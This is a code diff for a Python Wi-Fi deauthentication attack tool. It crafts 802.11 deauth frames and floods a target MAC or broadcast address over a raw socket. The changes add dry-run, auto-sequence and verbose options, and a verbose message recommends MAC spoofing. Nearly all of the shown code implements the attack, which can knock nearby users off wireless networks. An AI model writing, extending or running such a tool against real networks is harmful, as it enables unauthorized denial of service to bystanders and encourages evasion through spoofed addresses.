@@ -27,6 +27,7 @@ import struct
 import sys 
 import random
 import time
+from datetime import datetime
 
 def f_assem(args):
     # Parse command-line arguments
@@ -43,6 +44,9 @@ def f_assem(args):
     num_frames = args.count
     dur = args.duration
     randfrag = args.randomfrag
+    autoseq = args.autoseq
+    dry = args.dryrun
+    verbose = args.verbose
 
     if any(arg in sys.argv for arg in ("-h", "--help")):
         parser = argparse.ArgumentParser()
@@ -53,18 +57,15 @@ def f_assem(args):
         exit(1)
 
     # handle all illogical arguments
-    if (broadcast_attack or timedelay or frame_flood or num_frames or
+    if (timedelay or frame_flood or num_frames or randfrag or autoseq or dry or
     frag or seq_num or reason or dur) and not (dest_mac or broadcast_attack):
         print("Error: target input required") # requires target input for most operations
         exit(1)
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag or seq_num or reason or dur) and not network_bssid:
+    frag or seq_num or reason_code or dur or randfrag or autoseq or dry) and not network_bssid:
         print("Error: network BSSID required") # requires network BSSID for most operations
         exit(1)
-    # if frame_flood and (num_frames or timedelay):
-    #     print("Error: --flood requires no other arguments")
-    #     exit(1)
-    if broadcast_attack and dest_mac:
+    if (broadcast_attack and dest_mac):
         print("Invalid arguments, too many addresses in Address 1")
         exit(1)
     if not (broadcast_attack or dest_mac):
@@ -109,6 +110,16 @@ def f_assem(args):
     if not network_bssid:
         print("Invalid argument, missing Address 3")
         exit(1)
+
+    if dry:
+        print("Conducting dry run, no frames will be sent.")
+
+    if not source_mac and verbose:
+        print("Source Addres will use Network Address - MAC SPOOFING RECOMMENDED!!!")
+
+    if verbose:
+        td = datetime.now().strftime("Today's Date: %Y-%m-%d\nCurrent Time: %H:%M:%S")
+        print(td)
 
     return f_ctl, f_frag, f_dur, ct, src, net, ch
 
@@ -192,28 +203,24 @@ def main():
         print(f"Frame type: {f_ctl.hex().upper()}")
         print(f"Fragmentation set: {f_frag.hex()} - type: {ch}")
         print(f"Duration: {f_dur.hex().upper()}")
-        if broadcast_attack:
-            print("Destination: FF:FF:FF:FF:FF:FF")
-        elif dest_mac:
-            print(f"Destination: {dest_mac.upper()}")
-        if not source_mac:
-            print(f"Source: {network_bssid.upper()}")
-        elif source_mac:
-            print(f"Source: {source_mac.upper()}")
-        print(f"Network: {network_bssid.upper()}")
+        print(f"Destination: {ct.hex().upper()}")
+        print(f"Source: {src.hex().upper()}")
+        print(f"Network: {net.hex().upper()}")
         if not (autoseq or randfrag):
             print(f"Sequence Control: {seq.hex().upper()}")
         if (autoseq or randfrag):
             print("Sequence Control: DYNAMIC")
         if not reason_code:
-            print(f"Reason Code: {reason.def_code(0)}")
+            print(f"Reason Code: {reason.reasoncode_input(0).hex()} - {reason.def_code(0)}")
         if reason_code:
-            print(f"Reason Code: {reason.def_code(reason_code)}")
+            print(f"Reason Code: {reason.reasoncode_input(reason_code).hex()} - {reason.def_code(reason_code)}")
         print("-" * 100)
 
     if not dry:
     # Open the socket
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+        if verbose:
+            print(s)
         s.bind((interface, 0))
 
     r = reas()
@@ -227,7 +234,7 @@ def main():
             tg = ct.hex().upper()
             tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
             print("Starting deauth attack")
-            print(f"Flooding: {tgt}\nInterrupt with CTRL + C")
+            print(f"Flooding: {tgt}\nEnd attack with CTRL + C")
             if num_frames:
                 n = num_frames
                 print(f"Sending {n} frames.")
@@ -247,8 +254,8 @@ def main():
                         s.send(frame)
                     time.sleep(t)
                     nmframe += 1
-                except OSError as e:
-                    if e.errno == 100:
+                except OSError as eos:
+                    if eos.errno == 100:
                         time.sleep(1)
                         continue
         except KeyboardInterrupt:
@@ -260,23 +267,33 @@ def main():
         finally:
             print(f"Sent {nmframe} frames to {tgt}")
             if not dry:
+                if verbose:
+                    print(f"Socket {s} closed")
                 s.close()
+            print("Completed!!!")
 
     if not frame_flood:
         if timedelay:
             t = timedelay / 1000
             ti = timedelay
         if not timedelay:
+            if verbose:
+                print("Default setting is no delay between frames")
             ti = 0
+            t = ti
         if num_frames:
             n = num_frames
         if not num_frames:
+            if verbose:
+                print("Default setting sends 1 frame")
             n = 1
         try:
             if verbose:
                 verb()
             if timedelay:
-                print(f"Sending {n} frames at a rate of {ti} ms.")
+                print(f"Sending {n} frame(s) at a rate of {ti} ms.")
+            if not timedelay:
+                print(f"Sending {n} frame(s)")
             print("Starting deauth attack")
             for i in range(n):
                 try:
@@ -290,13 +307,15 @@ def main():
                         frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
                         print(frmes)
                         if timedelay:
-                            if ti < 1000:
+                            if ti == 0:
+                                print("")
+                            elif 0 < ti < 1000:
                                 print(f"Waiting {ti} ms...")
                             elif ti >= 1000:
                                 print(f"Waiting {ti / 1000} second(s)...")
                     time.sleep(t)
-                except OSError as e:
-                    if e.errno == 100:
+                except OSError as eos:
+                    if eos.errno == 100:
                         time.sleep(1)
                         continue
         except KeyboardInterrupt:
@@ -304,9 +323,11 @@ def main():
         except Exception as e:
             print(f"Error: {e}")
         finally:
-            print("Completed!!!")
             if not dry:
+                if verbose:
+                    print(f"Socket {s} closed")
                 s.close()
+            print("Completed!!!")
 
 if __name__ == "__main__":
     main()
